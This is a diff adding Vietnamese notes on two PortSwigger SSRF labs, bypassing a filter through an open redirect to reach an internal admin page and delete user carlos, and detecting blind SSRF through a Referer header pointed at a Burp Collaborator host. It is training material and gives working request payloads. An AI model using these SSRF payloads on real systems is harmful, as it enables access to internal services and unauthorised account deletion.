@@ -254,7 +254,52 @@ stockApi=http://localhost%2523@stock.weliketoshop.net/admin
 ```
 - Tiếp tục gửi request đế xóa user `carlos`
 
+### Lab: SSRF with filter bypass via open redirection vulnerability
+- Đến 1 blog bất kỳ
+- Sử dụng chức năng **check stock** và **next product**
+- Gủi cả 2 request này đến **Burp Repeater**
 
+```http
+GET /product/nextProduct?currentProductId=1&path=/product?productId=2 HTTP/2
+Host: 0a2d005a035d055f81b5d96b0093004f.web-security-academy.net
+```
+
+- Quan sát hành vi ứng dụng: Sau khi request được gửi đi ta nhận được status code **302 (Redirect)** đến `/product?productId=2`
+- Thử thay đổi path thành `https://google.com` để nó có **redirect** đến không => Thực sự **redirect**
+- Thử thay đổi path thành `http://192.168.0.12:8080/admin` => found với status code **302 (Redirect)** nhưng không tải được tài nguyên này, bởi vì đây là do trình duyệt của bạn **redirect** đến `http://192.168.0.12:8080/admin` chứ không phải **server**
+- Trở lại với request **check stock**
+
+```http
+POST /product/stock HTTP/2
+Host: 0a2d005a035d055f81b5d96b0093004f.web-security-academy.net
+...
+stockApi=/product/stock/check?productId=1&storeId=1
+```
+
+- Thử `stockApi=http://192.168.0.12:8080/admin` => server không chấp nhận trực tiếp như này hoặc có thể đã kiểm tra có phải domain của chính nó hay không
+- Thử `stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin` => Nó thực sự tải tài nguyên của trang **admin**
+- Quan sát tab **response**, ta thấy có đường dẫn đẻ xóa user `carlos`
+
+```html
+<a href="/admin/delete?username=carlos">Delete</a>
+```
+- Tiếp tục gửi request đế xóa user `carlos`
+
+### Lab: Blind SSRF with out-of-band detection
+- Ứng dụng có một tính năng `"analytics"` chạy ở phía server.
+- Khi mở trang sản phẩm, server sẽ:
+    - Đọc header **Referer** trong **HTTP request**.
+    - Dùng nó để gửi request **HTTP** đến chính **URL** trong **Referer** — ví dụ để thu thập số liệu truy cập.
+- Gửi request có header **Referer** đến **Burp Repeater**
+- Thay đổi **Referer** đến địa chỉ **Burp Collaborator** để thực hiện **ssrf**
+
+```http
+GET /product?productId=1 HTTP/2
+Host: 0a72007a04fb6958801d532c00e500b5.web-security-academy.net
+...
+Referer: https://3quamlytf7se2w5y1jiech4e75dw1npc.oastify.com
+```
+- **Pool now** trong **Burp Collaborator** để nhận request đến
 
 ---
 Goodluck! 🍀🍀🍀 
